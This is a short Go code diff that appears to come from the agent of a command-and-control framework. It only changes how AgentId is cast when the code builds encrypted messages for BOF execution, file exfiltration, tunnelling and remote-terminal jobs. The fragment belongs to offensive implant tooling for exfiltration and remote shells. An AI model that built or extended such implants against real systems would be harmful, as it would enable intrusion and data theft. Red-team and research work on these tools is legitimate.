@@ -691,7 +691,7 @@ func jobExecBofAsync(paramsData []byte) ([]byte, error) {
 			delete(JOBS, params.Task)
 		}()
 
-		jobPack, _ := msgpack.Marshal(utils.JobPack{Id: uint(AgentId), Type: profile.Type, Task: params.Task})
+		jobPack, _ := msgpack.Marshal(utils.JobPack{Id: AgentId, Type: profile.Type, Task: params.Task})
 		jobMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.BOF_PACK, Data: jobPack})
 		jobMsg, _ = utils.EncryptData(jobMsg, encKey)
 
@@ -914,7 +914,7 @@ func jobDownloadStart(paramsData []byte) ([]byte, error) {
 			delete(DOWNLOADS, strFileId)
 		}()
 
-		exfilPack, _ := msgpack.Marshal(utils.ExfilPack{Id: uint(AgentId), Type: profile.Type, Task: params.Task})
+		exfilPack, _ := msgpack.Marshal(utils.ExfilPack{Id: AgentId, Type: profile.Type, Task: params.Task})
 		exfilMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.EXFIL_PACK, Data: exfilPack})
 		exfilMsg, _ = utils.EncryptData(exfilMsg, encKey)
 
@@ -1055,7 +1055,7 @@ func jobRun(paramsData []byte) ([]byte, error) {
 			delete(JOBS, params.Task)
 		}()
 
-		jobPack, _ := msgpack.Marshal(utils.JobPack{Id: uint(AgentId), Type: profile.Type, Task: params.Task})
+		jobPack, _ := msgpack.Marshal(utils.JobPack{Id: AgentId, Type: profile.Type, Task: params.Task})
 		jobMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.JOB_PACK, Data: jobPack})
 		jobMsg, _ = utils.EncryptData(jobMsg, encKey)
 
@@ -1321,7 +1321,7 @@ func jobTunnel(paramsData []byte) {
 		tunIv := make([]byte, 16)
 		_, _ = rand.Read(tunIv)
 
-		jobPack, _ := msgpack.Marshal(utils.TunnelPack{Id: uint(AgentId), Type: profile.Type, ChannelId: params.ChannelId, Key: tunKey, Iv: tunIv, Alive: active, Reason: reason})
+		jobPack, _ := msgpack.Marshal(utils.TunnelPack{Id: AgentId, Type: profile.Type, ChannelId: params.ChannelId, Key: tunKey, Iv: tunIv, Alive: active, Reason: reason})
 		jobMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.TUNNEL_PACK, Data: jobPack})
 		jobMsg, _ = utils.EncryptData(jobMsg, encKey)
 
@@ -1469,7 +1469,7 @@ func jobTerminal(paramsData []byte) {
 		tunIv := make([]byte, 16)
 		_, _ = rand.Read(tunIv)
 
-		jobPack, _ := msgpack.Marshal(utils.TermPack{Id: uint(AgentId), TermId: params.TermId, Key: tunKey, Iv: tunIv, Alive: active, Status: status})
+		jobPack, _ := msgpack.Marshal(utils.TermPack{Id: AgentId, TermId: params.TermId, Key: tunKey, Iv: tunIv, Alive: active, Status: status})
 		jobMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.TERMINAL_PACK, Data: jobPack})
 		jobMsg, _ = utils.EncryptData(jobMsg, encKey)
 
